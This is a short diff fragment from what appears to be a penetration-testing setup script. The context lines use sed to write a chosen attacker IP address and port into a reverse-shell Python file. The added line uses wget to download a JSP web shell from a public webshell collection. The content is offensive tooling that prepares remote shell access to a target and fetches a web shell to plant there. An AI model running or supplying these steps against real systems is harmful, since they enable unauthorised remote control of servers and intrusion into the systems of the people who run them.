@@ -139,3 +139,4 @@ EOT
 sed -i "s/127.0.0.1/$source_ip/g" revserse_shell.py
 sed -i "s/4444/$source_port/g" revserse_shell.py
 
+wget -N https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp
